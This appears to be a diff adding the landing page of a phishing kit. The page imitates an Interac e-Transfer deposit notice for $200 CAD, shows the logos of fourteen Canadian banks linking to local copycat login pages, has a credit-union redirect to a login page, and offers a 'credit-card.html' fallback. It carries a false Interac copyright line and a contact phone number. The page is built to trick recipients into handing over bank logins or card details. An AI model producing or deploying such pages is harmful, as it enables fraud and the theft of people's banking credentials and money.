@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interact | Deposit Your Money</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <img src="images/interact_logo.png" alt="Interac Logo" class="logo">
+            <div class="header-text">
+                <p><a href="tel:+12267700908">Contact Us</a></p>
+                <p>About</p>
+                <p>French</p>
+            </div>
+        </header>        
+
+        <div class="trans-info">
+            <div class="trans-info-content">
+                <h1>Deposit Your Money</h1>
+                <p class="amount"><strong>$200.00 CAD</strong></p>
+                <p>From: Ibad</p>
+            </div>
+            <div class="expiry-info">
+                <p>Expires: December 31, 2024</p>
+                <p>Reference #: CAJGW3a</p>
+            </div>
+        </div>
+        
+        <section>
+            <h2>Select Your Financial Institution</h2>
+            <div class="bank-icons">
+                <a href="login_pages/ATB.html" target="_blank"><img src="bank_logos/ATB.webp" alt="ATB Financial"></a>
+                <a href="login_pages/BMO.html" target="_blank"><img src="bank_logos/BMO.webp" alt="BMO"></a>
+                <a href="login_pages/CIBC.html" target="_blank"><img src="bank_logos/CIBC.webp" alt="CIBC"></a>
+                <a href="login_pages/Desjardins.html" target="_blank"><img src="bank_logos/Desjardins.webp" alt="Desjardins"></a>
+                <a href="login_pages/HSBC.html" target="_blank"><img src="bank_logos/HSBC.webp" alt="HSBC"></a>
+                <a href="login_pages/Manulife.html" target="_blank"><img src="bank_logos/Manulife.webp" alt="Manulife"></a>
+                <a href="login_pages/meridian.html" target="_blank"><img src="bank_logos/meridian.webp" alt="Meridian"></a>
+                <a href="login_pages/National.html" target="_blank"><img src="bank_logos/National.webp" alt="National Bank"></a>
+                <a href="login_pages/PC.html" target="_blank"><img src="bank_logos/PC.webp" alt="PC Financial"></a>
+                <a href="login_pages/RBC.html" target="_blank"><img src="bank_logos/RBC.webp" alt="RBC"></a>
+                <a href="login_pages/Scotia.html" target="_blank"><img src="bank_logos/Scotia.webp" alt="Scotiabank"></a>
+                <a href="login_pages/Simplii.html" target="_blank"><img src="bank_logos/Simplii.webp" alt="Simplii Financial"></a>
+                <a href="login_pages/Tangerine.html" target="_blank"><img src="bank_logos/Tangerine.png" alt="Tangerine"></a>
+                <a href="login_pages/TD.html" target="_blank"><img src="bank_logos/TD.webp" alt="TD Bank"></a>
+            </div>
+            <div class="or-divider">OR</div>
+            <div class="dropdown-section">
+                <form id="loginRedirectForm">
+                    <div>
+                        <label for="province">Select Province or Territory</label>
+                        <select id="province" name="province" required>
+                            <option value="">Select Province</option>
+                            <option value="BC">British Columbia</option>
+                            <option value="ON">Ontario</option>
+                            <option value="QC">Quebec</option>
+                            <option value="AB">Alberta</option>
+                            <option value="SK">Saskatchewan</option>
+                            <option value="MB">Manitoba</option>
+                            <option value="NB">New Brunswick</option>
+                            <option value="NL">Newfoundland and Labrador</option>
+                            <option value="PE">Prince Edward Island</option>
+                            <option value="NT">Northwest Territories</option>
+                            <option value="NS">Nova Scotia</option>
+                            <option value="NU">Nunavut</option>
+                            <option value="YT">Yukon</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label for="creditUnion">Select Credit Union</label>
+                        <select id="creditUnion" name="creditUnion" required>
+                            <option value="">Select Credit Union</option>
+                            <option value="VanCity">VanCity</option>
+                            <option value="CoastCapital">Coast Capital Savings</option>
+                            <option value="FirstWest">First West Credit Union</option>
+                            <option value="Servus">Servus Credit Union</option>
+                        </select>
+                    </div>
+                    <button type="button" class="login-button" onclick="redirectToLogin()">Proceed to Login ></button>
+                </form>
+            </div>
+        <div class="alternate-options">
+            <h3>Don't Bank Online?</h3>
+            <p>If you haven’t registered for online banking at your financial institution or if you can’t find your bank in the above options, there are other ways you can deposit your money.</p>
+            <button class="other-options-button" onclick="window.location.href='credit-card.html'">Other Options</button>
+        </div>
+        </section>
+
+        <footer>
+            <div class="footer-content">
+                <p>Interac e-Transfer | Privacy Policy | Security</p>
+                <p>© 2024 Interac Corp. All rights reserved. <a href="#">Terms of Use</a></p>
+            </div>
+        </footer>
+    </div>
+</body>
+<script>
+    function redirectToLogin() {
+        const province = document.getElementById('province').value;
+        const creditUnion = document.getElementById('creditUnion').value;
+
+        if (!province || !creditUnion) {
+            alert('Please select both a province and a credit union.');
+            return;
+        }
+
+        // Encode the values to safely include them in the URL
+        const encodedProvince = encodeURIComponent(province);
+        const encodedCreditUnion = encodeURIComponent(creditUnion);
+
+        // Construct the URL with query parameters
+        const loginUrl = `login.html?province=${encodedProvince}&creditUnion=${encodedCreditUnion}`;
+
+        // Redirect to the login page
+        window.location.href = loginUrl;
+    }
+</script>
+</html>
